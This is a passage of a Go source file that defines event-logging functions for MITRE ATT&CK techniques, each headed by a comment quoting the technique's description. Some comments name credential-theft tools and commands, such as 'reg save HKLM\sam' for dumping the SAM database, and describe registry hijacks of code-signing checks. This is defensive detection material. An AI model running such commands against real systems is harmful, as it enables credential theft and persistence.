only legitimately signed code to execute on a system. Adversaries may hijack SIP
and trust provider components to mislead operating system and application
control tools to classify malicious (or any) code as signed by: (Citation:
SpectorOps Subverting Trust Sept 2017)  Modifying the Dll and FuncName Registry
values in HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType
0\CryptSIPDllGetSignedDataMsg{SIP_GUID} that point to the dynamic link library
(DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an
encoded digital certificate from a signed file. By pointing to a maliciously-
crafted DLL with an exported function that always returns a known good signature
value (ex: a Microsoft signature for Portable Executables) rather than the
file’s real signature, an adversary can apply an acceptable signature value to
all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash
mismatch will likely occur, invalidating the signature, since the hash returned
by the function will not match the value computed from the file). Modifying the
Dll and FuncName Registry values in
HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType
0\CryptSIPDllVerifyIndirectData{SIP_GUID} that point to the DLL providing a
SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed
hash against the signed hash value. By pointing to a maliciously-crafted DLL
with an exported function that always returns TRUE (indicating that the
validation was successful), an adversary can successfully validate any file
(with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept
2017) (with or without hijacking the previously mentioned
CryptSIPDllGetSignedDataMsg function). This Registry value could also be
redirected to a suitable exported function from an already present DLL, avoiding
the requirement to drop and execute a new file on disk. Modifying the DLL and
Function Registry values in HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Pro
viders\Trust\FinalPolicy{trust provider GUID} that point to the DLL providing a
trust provider’s FinalPolicy function, which is where the decoded and parsed
signature is checked and the majority of trust decisions are made. Similar to
hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be
redirected to a suitable exported function from an already present DLL or a
maliciously-crafted DLL (though the implementation of a trust provider is
complex). Note: The above hijacks are also possible without modifying the
Registry via DLL Search Order Hijacking.  Hijacking SIP or trust provider
components can also enable persistent code execution, since these malicious
components may be invoked by any application that performs code signing or
signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)
*/
func (g *Session) ATTACKEntSIPandTrustProviderHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553.003").
        Msg("sip and trust provider hijacking")
}

/* ATTACKEntSMBWindowsAdminShares Phases: lateral-movement

Adversaries may use Valid Accounts to interact with a remote network share using
Server Message Block (SMB). The adversary may then perform actions as the
logged-on user. SMB is a file, printer, and serial port sharing protocol for
Windows machines on the same network or domain. Adversaries may use SMB to
interact with file shares, allowing them to move laterally throughout a network.
Linux and macOS implementations of SMB typically use Samba. Windows systems have
hidden network shares that are accessible only to administrators and provide the
ability for remote file copy and other administrative functions. Example network
shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in
conjunction with administrator-level Valid Accounts to remotely access a
networked system over SMB,(Citation: Wikipedia Server Message Block) to interact
with systems using remote procedure calls (RPCs),(Citation: TechNet RPC)
transfer files, and run transferred binaries through remote Execution. Example
execution techniques that rely on authenticated sessions over SMB/RPC are
Scheduled Task/Job, Service Execution, and Windows Management Instrumentation.
Adversaries can also use NTLM hashes to access administrator shares on systems
with Pass the Hash and certain configuration and patch levels.(Citation:
Microsoft Admin Shares)
*/
func (g *Session) ATTACKEntSMBWindowsAdminShares(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021.002").
        Msg("smb/windows admin shares")
}

/* ATTACKEntSNMPMIBDump Phases: collection

Adversaries may target the Management Information Base (MIB) to collect and/or
mine valuable information in a network managed using Simple Network Management
Protocol (SNMP). The MIB is a configuration repository that stores variable
information accessible via SNMP in the form of object identifiers (OID). Each
OID identifies a variable that can be read or set and permits active management
tasks, such as configuration changes, through remote modification of these
variables. SNMP can give administrators great insight in their systems, such as,
system information, description of hardware, physical location, and software
packages(Citation: SANS Information Security Reading Room Securing SNMP Securing
SNMP). The MIB may also contain device operational information, including
running configuration, routing table, and interface details. Adversaries may use
SNMP queries to collect MIB content directly from SNMP-managed devices in order
to collect network information that allows the adversary to build network maps
and facilitate future targeted exploitation.(Citation: US-CERT-
TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)
*/
func (g *Session) ATTACKEntSNMPMIBDump(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1602.001").
        Msg("snmp (mib dump)")
}

/* ATTACKEntSQLStoredProcedures Phases: persistence

Adversaries may abuse SQL stored procedures to establish persistent access to
systems. SQL Stored Procedures are code that can be saved and reused so that
database users do not waste time rewriting frequently used SQL queries. Stored
procedures can be invoked via SQL statements to the database using the procedure
name or via defined events (e.g. when a SQL server application is
started/restarted). Adversaries may craft malicious stored procedures that can
provide a persistence mechanism in SQL database servers.(Citation: NetSPI
Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute
operating system commands through SQL syntax the adversary may have to enable
additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI
Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation:
Microsoft xp_cmdshell 2017)  Microsoft SQL Server can enable common language
runtime (CLR) integration. With CLR integration enabled, application developers
can write stored procedures using any .NET framework language (e.g. VB .NET, C#,
etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify
CLR assemblies that are linked to stored procedures since these CLR assemblies
can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)
*/
func (g *Session) ATTACKEntSQLStoredProcedures(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1505.001").
        Msg("sql stored procedures")
}

/* ATTACKEntSSH Phases: lateral-movement

Adversaries may use Valid Accounts to log into remote machines using Secure
Shell (SSH). The adversary may then perform actions as the logged-on user. SSH
is a protocol that allows authorized users to open remote shells on other
computers. Many Linux and macOS versions come with SSH installed by default,
although typically disabled until the user enables it. The SSH server can be
configured to use standard password authentication or public-private keypairs in
lieu of or in addition to a password. In this authentication scenario, the
user’s public key must be in a special file on the computer running the server
that lists which keypairs are allowed to login as that user.(Citation: SSH
Secure Shell)
*/
func (g *Session) ATTACKEntSSH(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021.004").
        Msg("ssh")
}

/* ATTACKEntSSHAuthorizedKeys Phases: persistence

Adversaries may modify the SSH authorized_keys file to maintain persistence on a
victim host. Linux distributions and macOS commonly use key-based authentication
to secure the authentication process of SSH sessions for remote management. The
authorized_keys file in SSH specifies the SSH keys that can be used for logging
into the user account for which the file is configured. This file is usually
found in the user's home directory under <user-
home>/.ssh/authorized_keys.(Citation: SSH Authorized Keys) Users may edit the
system’s SSH config file to modify the directives PubkeyAuthentication and
RSAAuthentication to the value “yes” to ensure public key and RSA authentication
are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.
Adversaries may modify SSH authorized_keys files directly with scripts or shell
commands to add their own adversary-supplied public keys. This ensures that an
adversary possessing the corresponding private key may log in as an existing
user via SSH.(Citation: Venafi SSH Key Abuse) (Citation: Cybereason Linux Exim
Worm)
*/
func (g *Session) ATTACKEntSSHAuthorizedKeys(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1098.004").
        Msg("ssh authorized keys")
}

/* ATTACKEntSSHHijacking Phases: lateral-movement

Adversaries may hijack a legitimate user's SSH session to move laterally within
an environment. Secure Shell (SSH) is a standard means of remote access on Linux
and macOS systems. It allows a user to connect to another system via an
encrypted tunnel, commonly authenticating through a password, certificate or the
use of an asymmetric encryption key pair. In order to move laterally from a
compromised host, adversaries may take advantage of trust relationships
established with other systems via public key authentication in active SSH
sessions by hijacking an existing connection to another system. This may occur
through compromising the SSH agent itself or by having access to the agent's
socket. If an adversary is able to obtain root access, then hijacking SSH
sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack
Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem
SSH Hijack) SSH Hijacking differs from use of SSH because it hijacks an existing
SSH session rather than creating a new session using Valid Accounts.
*/
func (g *Session) ATTACKEntSSHHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1563.001").
        Msg("ssh hijacking")
}

/* ATTACKEntScanDatabases Phases: reconnaissance

Adversaries may search within public scan databases for information about
victims that can be used during targeting. Various online services continuously
publish the results of Internet scans/surveys, often harvesting information such
as active IP addresses, hostnames, open ports, certificates, and even server
banners.(Citation: Shodan) Adversaries may search scan databases to gather
actionable information. Threat actors can use online resources and lookup tools
to harvest information from these services. Adversaries may seek information
about their already identified targets, or use these datasets to discover
opportunities for successful breaches. Information from these sources may reveal
opportunities for other forms of reconnaissance (ex: Active Scanning or Search
Open Websites/Domains), establishing operational resources (ex: Develop
Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote
Services or Exploit Public-Facing Application).
*/
func (g *Session) ATTACKEntScanDatabases(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1596.005").
        Msg("scan databases")
}

/* ATTACKEntScanningIPBlocks Phases: reconnaissance

Adversaries may scan victim IP blocks to gather information that can be used
during targeting. Public IP addresses may be allocated to organizations by
block, or a range of sequential addresses. Adversaries may scan IP blocks in
order to Gather Victim Network Information, such as which IP addresses are
actively in use as well as more detailed information about hosts assigned these
addresses. Scans may range from simple pings (ICMP requests and responses) to
more nuanced scans that may reveal host software/versions via server banners or
other network artifacts.(Citation: Botnet Scan) Information from these scans may
reveal opportunities for other forms of reconnaissance (ex: Search Open
Websites/Domains or Search Open Technical Databases), establishing operational
resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial
access (ex: External Remote Services).
*/
func (g *Session) ATTACKEntScanningIPBlocks(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1595.001").
        Msg("scanning ip blocks")
}

/* ATTACKEntScheduledTask Phases: execution persistence privilege-escalation

Adversaries may abuse the Windows Task Scheduler to perform task scheduling for
initial or recurring execution of malicious code. There are multiple ways to
access the Task Scheduler in Windows. The schtasks can be run directly on the
command line, or the Task Scheduler can be opened through the GUI within the
Administrator Tools section of the Control Panel. In some cases, adversaries
have used a .NET wrapper for the Windows Task Scheduler, and alternatively,
adversaries have used the Windows netapi32 library to create a scheduled task.
The deprecated at utility could also be abused by adversaries (ex: At
(Windows)), though at.exe can not access tasks created with schtasks or the
Control Panel. An adversary may use Windows Task Scheduler to execute programs
at system startup or on a scheduled basis for persistence. The Windows Task
Scheduler can also be abused to conduct remote Execution as part of Lateral
Movement and or to run a process under the context of a specified account (such
as SYSTEM).
*/
func (g *Session) ATTACKEntScheduledTask(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.005").
        Msg("scheduled task")
}

/* ATTACKEntScheduledTaskJob Phases: execution persistence privilege-escalation

Adversaries may abuse task scheduling functionality to facilitate initial or
recurring execution of malicious code. Utilities exist within all major
operating systems to schedule programs or scripts to be executed at a specified
date and time. A task can also be scheduled on a remote system, provided the
proper authentication is met (ex: RPC and file and printer sharing in Windows
environments). Scheduling a task on a remote system typically requires being a
member of an admin or otherwise privileged group on the remote system.(Citation:
TechNet Task Scheduler Security) Adversaries may use task scheduling to execute
programs at system startup or on a scheduled basis for persistence. These
mechanisms can also be abused to run a process under the context of a specified
account (such as one with elevated permissions/privileges).
*/
func (g *Session) ATTACKEntScheduledTaskJob(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053").
        Msg("scheduled task/job")
}

/* ATTACKEntScheduledTransfer Phases: exfiltration

Adversaries may schedule data exfiltration to be performed only at certain times
of day or at certain intervals. This could be done to blend traffic patterns
with normal activity or availability. When scheduled exfiltration is used, other
exfiltration techniques likely apply as well to transfer the information out of
the network, such as Exfiltration Over C2 Channel or Exfiltration Over
Alternative Protocol.
*/
func (g *Session) ATTACKEntScheduledTransfer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1029").
        Msg("scheduled transfer")
}

/* ATTACKEntScreenCapture Phases: collection

Adversaries may attempt to take screen captures of the desktop to gather
information over the course of an operation. Screen capturing functionality may
be included as a feature of a remote access tool used in post-compromise
operations. Taking a screenshot is also typically possible through native
utilities or API calls, such as CopyFromScreen, xwd, or screencapture.(Citation:
CopyFromScreen .NET)(Citation: Antiquated Mac Malware)
*/
func (g *Session) ATTACKEntScreenCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1113").
        Msg("screen capture")
}

/* ATTACKEntScreensaver Phases: privilege-escalation persistence

Adversaries may establish persistence by executing malicious content triggered
by user inactivity. Screensavers are programs that execute after a configurable
time of user inactivity and consist of Portable Executable (PE) files with a
.scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver
application scrnsave.scr is located in C:\Windows\System32\, and
C:\Windows\sysWOW64\  on 64-bit Windows systems, along with screensavers
included with base Windows installations. The following screensaver settings are
stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to
achieve persistence:  SCRNSAVE.exe - set to malicious PE path ScreenSaveActive -
set to '1' to enable the screensaver ScreenSaverIsSecure - set to '0' to not
require a password to unlock ScreenSaveTimeout - sets user inactivity timeout
before screensaver is executed  Adversaries can use screensaver settings to
maintain persistence by setting the screensaver to run malware after a certain
timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)
*/
func (g *Session) ATTACKEntScreensaver(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.002").
        Msg("screensaver")
}

/* ATTACKEntScripting Phases: defense-evasion execution

This technique has been deprecated. Please use Command and Scripting Interpreter
where appropriate. Adversaries may use scripts to aid in operations and perform
multiple actions that would otherwise be manual. Scripting is useful for
speeding up operational tasks and reducing the time required to gain access to
critical resources. Some scripting languages may be used to bypass process
monitoring mechanisms by directly interacting with the operating system at an
API level instead of calling other programs. Common scripting languages for
Windows include VBScript and PowerShell but could also be in the form of
command-line batch scripts. Scripts can be embedded inside Office documents as
macros that can be set to execute when files used in Spearphishing Attachment
and other types of spearphishing are opened. Malicious embedded macros are an
alternative means of execution than software exploitation through Exploitation
for Client Execution, where adversaries will rely on macros being allowed or
that the user will accept to activate them. Many popular offensive frameworks
exist which use forms of scripting for security testers and adversaries alike.
Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and
PowerSploit (Citation: Powersploit) are three examples that are popular among
penetration testers for exploit and post-compromise operations and include many
features for evading defenses. Some adversaries are known to use PowerShell.
(Citation: Alperovitch 2014)
*/
func (g *Session) ATTACKEntScripting(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1064").
        Msg("scripting")
}

/* ATTACKEntSearchClosedSources Phases: reconnaissance

Adversaries may search and gather information about victims from closed sources
that can be used during targeting. Information about victims may be available
for purchase from reputable private sources and databases, such as paid
subscriptions to feeds of technical/threat intelligence data.(Citation:
D3Secutrity CTI Feeds) Adversaries may also purchase information from less-
reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET
Selling Data) Adversaries may search in different closed databases depending on
what information they seek to gather. Information from these sources may reveal
opportunities for other forms of reconnaissance (ex: Phishing for Information or
Search Open Websites/Domains), establishing operational resources (ex: Develop
Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote
Services or Valid Accounts).
*/
func (g *Session) ATTACKEntSearchClosedSources(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1597").
        Msg("search closed sources")
}

/* ATTACKEntSearchEngines Phases: reconnaissance

Adversaries may use search engines to collect information about victims that can
be used during targeting. Search engine services typical crawl online sites to
index context and may provide users with specialized syntax to search for
specific keywords or specific types of content (i.e. filetypes).(Citation:
SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking) Adversaries
may craft various search engine queries depending on what information they seek
to gather. Threat actors may use search engines to harvest general information
about victims, as well as use specialized queries to look for spillages/leaks of
sensitive information such as network details or credentials. Information from
these sources may reveal opportunities for other forms of reconnaissance (ex:
Phishing for Information or Search Open Technical Databases), establishing
operational resources (ex: Establish Accounts or Compromise Accounts), and/or
initial access (ex: Valid Accounts or Phishing).
*/
func (g *Session) ATTACKEntSearchEngines(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1593.002").
        Msg("search engines")
}

/* ATTACKEntSearchOpenTechnicalDatabases Phases: reconnaissance

Adversaries may search freely available technical databases for information
about victims that can be used during targeting. Information about victims may
be available in online databases and repositories, such as registrations of
domains/certificates as well as public collections of network data/artifacts
gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS
Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation:
SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan) Adversaries
may search in different open databases depending on what information they seek
to gather. Information from these sources may reveal opportunities for other
forms of reconnaissance (ex: Phishing for Information or Search Open
Websites/Domains), establishing operational resources (ex: Acquire
Infrastructure or Compromise Infrastructure), and/or initial access (ex:
External Remote Services or Trusted Relationship).
*/
func (g *Session) ATTACKEntSearchOpenTechnicalDatabases(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1596").
        Msg("search open technical databases")
}

/* ATTACKEntSearchOpenWebsitesDomains Phases: reconnaissance

Adversaries may search freely available websites and/or domains for information
about victims that can be used during targeting. Information about victims may
be available in various online sites, such as social media, new sites, or those
hosting information about business operations such as hiring or
requested/rewarded contracts.(Citation: Cyware Social Media)(Citation:
SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking) Adversaries
may search in different online sites depending on what information they seek to
gather. Information from these sources may reveal opportunities for other forms
of reconnaissance (ex: Phishing for Information or Search Open Technical
Databases), establishing operational resources (ex: Establish Accounts or
Compromise Accounts), and/or initial access (ex: External Remote Services or
Phishing).
*/
func (g *Session) ATTACKEntSearchOpenWebsitesDomains(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1593").
        Msg("search open websites/domains")
}

/* ATTACKEntSearchVictimOwnedWebsites Phases: reconnaissance

Adversaries may search websites owned by the victim for information that can be
used during targeting. Victim-owned websites may contain a variety of details,
including names of departments/divisions, physical locations, and data about key
employees such as names, roles, and contact info (ex: Email Addresses). These
sites may also have details highlighting business operations and
relationships.(Citation: Comparitech Leak) Adversaries may search victim-owned
websites to gather actionable information. Information from these sources may
reveal opportunities for other forms of reconnaissance (ex: Phishing for
Information or Search Open Technical Databases), establishing operational
resources (ex: Establish Accounts or Compromise Accounts), and/or initial access
(ex: Trusted Relationship or Phishing).
*/
func (g *Session) ATTACKEntSearchVictimOwnedWebsites(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1594").
        Msg("search victim-owned websites")
}

/* ATTACKEntSecurityAccountManager Phases: credential-access

Adversaries may attempt to extract credential material from the Security Account
Manager (SAM) database either through in-memory techniques or through the
Windows Registry where the SAM database is stored. The SAM is a database file
that contains local accounts for the host, typically those found with the net
user command. Enumerating the SAM database requires SYSTEM level access. A
number of tools can be used to retrieve the SAM file through in-memory
techniques:  pwdumpx.exe gsecdump Mimikatz secretsdump.py  Alternatively, the
SAM can be extracted from the Registry with Reg:  reg save HKLM\sam sam reg save
HKLM\system system  Creddump7 can then be used to process the SAM database
locally to retrieve hashes.(Citation: GitHub Creddump7) Notes:  * RID 500
account is the local, built-in administrator. * RID 501 is the guest account. *
User accounts start with a RID of 1,000+.
*/
func (g *Session) ATTACKEntSecurityAccountManager(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.002").
        Msg("security account manager")
}

/* ATTACKEntSecuritySoftwareDiscovery Phases: discovery

Adversaries may attempt to get a listing of security software, configurations,
defensive tools, and sensors that are installed on a system or in a cloud
environment. This may include things such as firewall rules and anti-virus.
Adversaries may use the information from Security Software Discovery during
automated discovery to shape follow-on behaviors, including whether or not the
adversary fully infects the target and/or attempts specific actions. Example
commands that can be used to obtain security software information are netsh, reg
query with Reg, dir with cmd, and Tasklist, but other indicators of discovery
behavior may be more specific to the type of software or security system the
adversary is looking for. It is becoming more common to see macOS malware
perform checks for LittleSnitch and KnockKnock software. Adversaries may also
utilize cloud APIs to discover the configurations of firewall rules within an
environment.(Citation: Expel IO Evil in AWS)
*/
func (g *Session) ATTACKEntSecuritySoftwareDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1518.001").
        Msg("security software discovery")
}

/* ATTACKEntSecuritySupportProvider Phases: persistence privilege-escalation

Adversaries may abuse security support providers (SSPs) to execute DLLs when the
system boots. Windows SSP DLLs are loaded into the Local Security Authority
(LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to
encrypted and plaintext passwords that are stored in Windows, such as any
logged-on user's Domain password or smart card PINs. The SSP configuration is
stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
Packages. An adversary may modify these Registry keys to add new SSPs, which
will be loaded the next time the system boots, or when the AddSecurityPackage
Windows API function is called.(Citation: Graeber 2014)
*/
func (g *Session) ATTACKEntSecuritySupportProvider(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.005").
        Msg("security support provider")
}

/* ATTACKEntSecuritydMemory Phases: credential-access

An adversary may obtain root access (allowing them to read securityd’s memory),
then they can scan through memory to find the correct sequence of keys in
relatively few tries to decrypt the user’s logon keychain. This provides the
adversary with all the plaintext passwords for users, WiFi, mail, browsers,
certificates, secure notes, etc.(Citation: OS X Keychain) (Citation: OSX Keydnap
malware) In OS X prior to El Capitan, users with root access can read plaintext
keychain passwords of logged-in users because Apple’s keychain implementation
allows these credentials to be cached so that users are not repeatedly prompted
for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X
Way) Apple’s securityd utility takes the user’s logon password, encrypts it with
PBKDF2, and stores this master key in memory. Apple also uses a set of keys and
algorithms to encrypt the user’s password, but once the master key is found, an
attacker need only iterate over the other values to unlock the final
password.(Citation: OS X Keychain)
*/
func (g *Session) ATTACKEntSecuritydMemory(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1555.002").
        Msg("securityd memory")
}

/* ATTACKEntServer Phases: resource-development

Adversaries may buy, lease, or rent physical servers that can be used during
targeting. Use of servers allows an adversary to stage, launch, and execute an
operation. During post-compromise activity, adversaries may utilize servers for
various tasks, including for Command and Control. Instead of compromising a
third-party Server or renting a Virtual Private Server, adversaries may opt to
configure and run their own servers in support of operations. Adversaries may
only need a lightweight setup if most of their activities will take place using
online infrastructure. Or, they may need to build extensive infrastructure if
they want to test, communicate, and control other aspects of their activities on
their own systems.(Citation: NYTStuxnet)
*/
func (g *Session) ATTACKEntServer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583.004").
        Msg("server")
}

/* ATTACKEntServer2 Phases: resource-development

Adversaries may compromise third-party servers that can be used during
targeting. Use of servers allows an adversary to stage, launch, and execute an
operation. During post-compromise activity, adversaries may utilize servers for
various tasks, including for Command and Control. Instead of purchasing a Server
or Virtual Private Server, adversaries may compromise third-party servers in
support of operations. Adversaries may also compromise web servers to support
watering hole operations, as in Drive-by Compromise.
*/
func (g *Session) ATTACKEntServer2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584.004").
        Msg("server")
}

/* ATTACKEntServerSoftwareComponent Phases: persistence

Adversaries may abuse legitimate extensible development features of servers to
establish persistent access to systems. Enterprise server applications may
include features that allow developers to write and install software or scripts
to extend the functionality of the main application. Adversaries may install
malicious components to extend and abuse server applications.
*/
func (g *Session) ATTACKEntServerSoftwareComponent(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1505").
        Msg("server software component")
}

/* ATTACKEntServiceExecution Phases: execution

Adversaries may abuse the Windows service control manager to execute malicious
commands or payloads. The Windows service control manager (services.exe) is an
interface to manage and manipulate services.(Citation: Microsoft Service Control
Manager) The service control manager is accessible to users via GUI components
as well as system utilities such as sc.exe and Net. PsExec can also be used to
execute commands or payloads via a temporary Windows service created through the
service control manager API.(Citation: Russinovich Sysinternals) Adversaries may
leverage these mechanisms to execute malicious content. This can be done by
either executing a new or modified service. This technique is the execution used
in conjunction with Windows Service during service persistence or privilege
escalation.
*/
func (g *Session) ATTACKEntServiceExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1569.002").
        Msg("service execution")
}

/* ATTACKEntServiceExhaustionFlood Phases: impact

Adversaries may target the different network services provided by systems to
conduct a DoS. Adversaries often target DNS and web services, however others
have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server
software can be attacked through a variety of means, some of which apply
generally while others are specific to the software being used to provide the
service. One example of this type of attack is known as a simple HTTP flood,
where an adversary sends a large number of HTTP requests to a web server to
overwhelm it and/or an application that runs on top of it. This flood relies on
raw volume to accomplish the objective, exhausting any of the various resources
required by the victim software to provide the service.(Citation: Cloudflare
HTTPflood) Another variation, known as a SSL renegotiation attack, takes
advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes
mechanisms for the client and server to agree on an encryption algorithm to use
for subsequent secure connections. If SSL renegotiation is enabled, a request
can be made for renegotiation of the crypto algorithm. In a renegotiation
attack, the adversary establishes a SSL/TLS connection and then proceeds to make
a series of renegotiation requests. Because the cryptographic renegotiation has
a meaningful cost in computation cycles, this can cause an impact to the
availability of the service when done in volume.(Citation: Arbor SSLDoS April
2012)
*/
func (g *Session) ATTACKEntServiceExhaustionFlood(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1499.002").
        Msg("service exhaustion flood")
}

/* ATTACKEntServiceStop Phases: impact

Adversaries may stop or disable services on a system to render those services
unavailable to legitimate users. Stopping critical services or processes can
inhibit or stop response to an incident or aid in the adversary's overall
objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer
2018)(Citation: Novetta Blockbuster)  Adversaries may accomplish this by
disabling individual services of high importance to an organization, such as
MSExchangeIS, which will make Exchange content inaccessible (Citation: Novetta
Blockbuster). In some cases, adversaries may stop or disable many or all
services to render systems unusable.(Citation: Talos Olympic Destroyer 2018)
Services or processes may not allow for modification of their data stores while
running. Adversaries may stop services or processes in order to conduct Data
Destruction or Data Encrypted for Impact on the data stores of services like
Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)
*/
func (g *Session) ATTACKEntServiceStop(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1489").
        Msg("service stop")
}

/* ATTACKEntServicesFilePermissionsWeakness Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking the binaries
used by services. Adversaries may use flaws in the permissions of Windows
services to replace the binary that is executed upon service start. These
service processes may automatically execute specific binaries as part of their
functionality or to perform other actions. If the permissions on the file system
directory containing a target binary, or permissions on the binary itself are
improperly set, then the target binary may be overwritten with another binary
using user-level permissions and executed by the original process. If the
original process and thread are running under a higher permissions level, then
the replaced binary will also execute under higher-level permissions, which
could include SYSTEM. Adversaries may use this technique to replace legitimate
binaries with malicious ones as a means of executing code at a higher
permissions level. If the executing process is set to run at a specific time or
during a certain event (e.g., system bootup) then this technique can also be
used for persistence.
*/
func (g *Session) ATTACKEntServicesFilePermissionsWeakness(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.010").
        Msg("services file permissions weakness")
}

/* ATTACKEntServicesRegistryPermissionsWeakness Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking the Registry
entries used by services. Adversaries may use flaws in the permissions for
registry to redirect from the originally specified executable to one that they
control, in order to launch their own code at Service start.  Windows stores
local service configuration information in the Registry under
HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's
Registry keys can be manipulated to modify a service's execution parameters
through tools such as the service controller, sc.exe,  PowerShell, or Reg.
Access to Registry keys is controlled through Access Control Lists and
permissions. (Citation: Registry Key Security) If the permissions for users and
groups are not properly set and allow access to the Registry keys for a service,
then adversaries can change the service binPath/ImagePath to point to a
different executable under their control. When the service starts or is
restarted, then the adversary-controlled program will execute, allowing the
adversary to gain persistence and/or privilege escalation to the account context
the service is set to execute under (local/domain account, SYSTEM, LocalService,
or NetworkService). Adversaries may also alter Registry keys associated with
service failure parameters (such as FailureCommand) that may be executed in an
elevated context anytime the service fails or is intentionally
corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry
Perms Weakness)
*/
func (g *Session) ATTACKEntServicesRegistryPermissionsWeakness(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.011").
        Msg("services registry permissions weakness")
}

/* ATTACKEntSetuidandSetgid Phases: privilege-escalation defense-evasion

An adversary may perform shell escapes or exploit vulnerabilities in an
application with the setsuid or setgid bits to get code running in a different
user’s context. On Linux or macOS, when the setuid or setgid bits are set for an
application, the application will run with the privileges of the owning user or
group respectively. (Citation: setuid man page). Normally an application is run
in the current user’s context, regardless of which user or group owns the
application. However, there are instances where programs need to be executed in
an elevated context to function properly, but the user running them doesn’t need
the elevated privileges. Instead of creating an entry in the sudoers file, which
must be done by root, any user can specify the setuid or setgid flag to be set
for their own applications. These bits are indicated with an "s" instead of an
"x" when viewing a file's attributes via ls -l. The chmod program can set these
bits with via bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s
[file]. Adversaries can use this mechanism on their own malware to make sure
they're able to execute in elevated contexts in the future.(Citation: OSX
Keydnap malware).
*/
func (g *Session) ATTACKEntSetuidandSetgid(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1548.001").
        Msg("setuid and setgid")
}

/* ATTACKEntSharedModules Phases: execution

Adversaries may abuse shared modules to execute malicious payloads. The Windows
module loader can be instructed to load DLLs from arbitrary local paths and
arbitrary Universal Naming Convention (UNC) network paths. This functionality
